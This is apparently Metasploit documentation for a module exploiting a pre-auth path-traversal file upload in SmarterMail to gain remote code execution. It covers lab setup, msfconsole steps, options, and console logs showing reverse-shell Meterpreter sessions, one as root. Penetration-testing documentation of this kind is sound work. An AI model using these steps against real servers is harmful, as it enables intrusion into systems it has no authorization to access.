## Vulnerable Application
This module exploits a pre-auth remote code execution vulnerability in SmarterTools SmarterMail before version 100.0.9413.
The endpoint /api/upload fails to sanitize the contextData POST parameter which can contain JSON data with a
"guid" key that allows directory traversal. By leveraging this vulnerability, an unauthenticated attacker can
upload a malicious ASPX web shell to the server's web root directory, leading to remote code execution.

## Setup 

### Linux 
On Ubuntu 22, ensure that `curl` and `libicu` installed and then run the following:
```
curl -O https://downloads.smartertools.com/smartermail/100.0.9406/smartermail_9406 \
&& chmod +x smartermail_9406 \
&& sudo ./smartermail_9406 install
```
Navigate to `http://localhost` and complete the installation Wizard which involves setting the webroot, choosing a port to host the application on and creating an admin user.

If Docker is preferred, a full setup instructions can be founds here: https://help.smartertools.com/SmarterMail/Current/Topics/Installation/Installation-Docker

### Windows
On Windows Server 2022 (using Windows 10 or 11 will result in IIS errors), download the SmarterMail installer from:
https://downloads.smartertools.com/smartermail/100.0.9406/SmarterMail_9406.exe. Run the installer.

Navigate to `http://localhost` and complete the installation Wizard which involves setting the webroot, choosing a port to host the application on and creating an admin user.

## Verification Steps

1. Start `msfconsole`
2. `use  modules/exploits/multi/http/smarter_mail_guid_file_upload.`
3. `set RHOSTS [IP]`
3. `set LHOST [IP]`
4. (Optional) `set TARGET [0-1]` (0 for Linux, 1 for Windows)
5. (Optional) `set WEB_ROOT_RPORT [PORT]` (default: 80 for Windows)
6. (Optional) `set TARGET_DIR [PATH]` (default: /tmp for Linux, /inetpub/wwwroot for Windows)
4. `run`

## Options

### TARGET_DIR
The directory to upload the payload to. If the target is Linux, the default is /tmp. If the target is Windows,
the default is /inetpub/wwwroot.

### WEB_ROOT_RPORT
The port on which the webroot is being hosted on, this is specifically used when exploiting Windows targets.
IIS typically hosts the webroot on port 80 or 443, whereas SmarterMail is hosted on a different port (default 9998)
which is configured during the installation setup. The exploit drops the .aspx file in the webroot, so the correct port
must be specified in order to for it to be executed. Default: 80

### DEPTH
Depth for path traversal. Default: 15

## Scenarios

### Ubuntu 22.04 with SmarterMail 100.0.9406
```
msf exploit(multi/http/smartermail_guid_file_upload) > set rhosts 192.168.1.90
rhosts => 192.168.1.90
msf exploit(multi/http/smartermail_guid_file_upload) > set lhost 192.168.1.68
lhost => 192.168.1.68
msf exploit(multi/http/smartermail_guid_file_upload) > exploit
[*] Started reverse TCP handler on 192.168.1.68:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking target web server for a response...
[+] Target is running SmarterMail.
[*] Checking SmarterMail product version...
[+] Target is running SmarterMail Version 100.0.9406.
[+] The target appears to be vulnerable.
[*] Uploading payload to /tmp...
[+] The uploaded payload file is named: ntww_0
[*] Uploading cronjob to call payload...
[+] The uploaded payload file is named: bteqkp_0
[*] Sending stage (3090404 bytes) to 192.168.1.90
[+] Deleted /tmp/ntww_0
[+] Deleted /etc/cron.d/bteqkp_0
[*] Meterpreter session 7 opened (192.168.1.68:4444 -> 192.168.1.90:41170) at 2026-01-13 17:16:01 -0800

meterpreter > getuid
Server username: root
meterpreter > sysinfo
Computer     : 192.168.1.90
OS           : Ubuntu 22.04 (Linux 6.8.0-90-generic)
Architecture : x64
BuildTuple   : x86_64-linux-musl
Meterpreter  : x64/linux
meterpreter >
```

### Windows Server 2022 with SmarterMail 100.0.9406
```
msf exploit(multi/http/smartermail_guid_file_upload) > set rhosts 172.16.199.135
rhosts => 172.16.199.135
msf exploit(multi/http/smartermail_guid_file_upload) > set rport 17017
rport => 17017
msf exploit(multi/http/smartermail_guid_file_upload) > set web_root_rport 80
web_root_rport => 80
msf exploit(multi/http/smartermail_guid_file_upload) > set lhost 172.16.199.1
lhost => 172.16.199.1
msf exploit(multi/http/smartermail_guid_file_upload) > set target 1
target => 1
msf exploit(multi/http/smartermail_guid_file_upload) > set payload cmd/windows/http/x64/meterpreter/reverse_tcp
payload => cmd/windows/http/x64/meterpreter/reverse_tcp
[*] Started reverse TCP handler on 172.16.199.1:4444 
[*] Running automatic check ("set AutoCheck false" to disable)
[*] Checking target web server for a response...
[+] Target is running SmarterMail.
[*] Checking SmarterMail product version...
[+] Target is running SmarterMail Version 100.0.9406.
[+] The target appears to be vulnerable.
[*] Uploading payload to /inetpub/wwwroot...
[+] The uploaded payload file is named: puxqskqt_0.aspx
[*] Sending stage (232006 bytes) to 172.16.199.135
[*] Meterpreter session 1 opened (172.16.199.1:4444 -> 172.16.199.135:51565) at 2026-01-13 10:25:01 -0800

meterpreter > getuid
Server username: IIS APPPOOL\DefaultAppPool
meterpreter > sysinfo
Computer        : DC3
OS              : Windows Server 2022 (10.0 Build 20348).
Architecture    : x64
System Language : en_US
Domain          : MSF
Logged On Users : 8
Meterpreter     : x64/windows
``` 
